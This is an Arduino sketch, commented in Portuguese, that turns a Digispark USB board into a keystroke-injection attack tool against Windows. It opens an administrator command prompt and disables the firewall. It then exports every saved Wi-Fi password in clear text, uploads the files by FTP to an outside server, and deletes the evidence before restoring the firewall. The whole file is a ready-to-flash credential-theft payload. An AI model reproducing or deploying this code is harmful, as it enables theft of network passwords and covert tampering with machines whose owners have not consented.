#include "DigiKeyboard.h"

void setup() {
  pinMode(0, OUTPUT);      //LED no modelo B.
  pinMode(1, OUTPUT);      //LED no modelo A ou Pro.

  //Pisca o led 3 vezes alertando o inicio do script.
int lled = 0;
while (lled < 3) {
  digitalWrite(0, HIGH);   // Acende o LED.
  digitalWrite(1, HIGH);
  delay(200);              // Tempo de intervalo entre aceso e apagado do led.
  digitalWrite(0, LOW);    // Apaga o LED.
  digitalWrite(1, LOW); 
  delay(200);
  lled++;
}

  //Começo do script!
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1800); 
  //Executa o CMD como admin +~- 4sec.
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(700);
  DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3700);  //Demora um tempo maior para garantir acesso ao CMD como administrador.
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(60);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   
  //Derruba o firewall interno.
  DigiKeyboard.delay(1700);
  DigiKeyboard.print("netsh firewall set opmode mode=disable");
  DigiKeyboard.delay(36);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  //Envia os arquivos .xml com a senha para C: 
  DigiKeyboard.delay(500);
  DigiKeyboard.print("netsh wlan export profile key=clear folder=c:\\");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  //Posiciona o prompt na Raiz "C:\", onde serão gerados os .XML com os usuarios e senhas das Redes Wi-Fi.
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cd C:\\");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  //Loga no FTP.
  DigiKeyboard.delay(50);
  DigiKeyboard.print("ftp -i ftp.seudominio.com.br");  //Endereço do FTP.
  DigiKeyboard.delay(60);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(800);
  DigiKeyboard.print("admin");  //Usuario do FTP.
  DigiKeyboard.delay(80);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(100);
  DigiKeyboard.print("pass");  //Senha do FTP.
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  //Navega até o diretório no FTP onde sera salvo.
  DigiKeyboard.delay(900);
  DigiKeyboard.print("cd captura");  //Diretório no ftp onde sera salvo os arquivos.. deve existir.
  DigiKeyboard.delay(80);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
  DigiKeyboard.print("cd wifi");  //Sub-diretório do diretório acima onde sera salvo os arquivos.. deve existir.
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(133);
  DigiKeyboard.print("prompt");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(220);
  DigiKeyboard.print("prompt");
  DigiKeyboard.delay(60);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  //Pega os arquivos .xml com as senhas na raiz do "C:/" e encaminha para o FTP.
  DigiKeyboard.delay(50);
  DigiKeyboard.print("PUT ./*.xml");
  DigiKeyboard.delay(70);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  //Finaliza a conexão FTP.
  DigiKeyboard.delay(1570);
  DigiKeyboard.print("bye");
  DigiKeyboard.delay(62);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  //Exclui os arquivos .xml na raiz do C: !!exclui todos os .XML da Raiz C:/ , use com cuidado!!
  DigiKeyboard.delay(150);
  DigiKeyboard.print("del *.xml");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  //Reabilita o firewall.
  DigiKeyboard.delay(538);
  DigiKeyboard.print("netsh firewall set opmode mode=enable");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  //Fecha o CMD e conclui o ataque.
  DigiKeyboard.delay(182);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10);

  //Pisca o led 3 vezes alertando a conclusão o script.
  int lled2 = 0;
  while (lled2 < 3) {
  digitalWrite(0, HIGH);   // Acende o LED.
  digitalWrite(1, HIGH);
  delay(200);              // Tempo de intervalo entre aceso e apagado do led.
  digitalWrite(0, LOW);    // Apaga o LED.
  digitalWrite(1, LOW); 
  delay(200);
  lled2++;
}
  
}


void loop() {

}
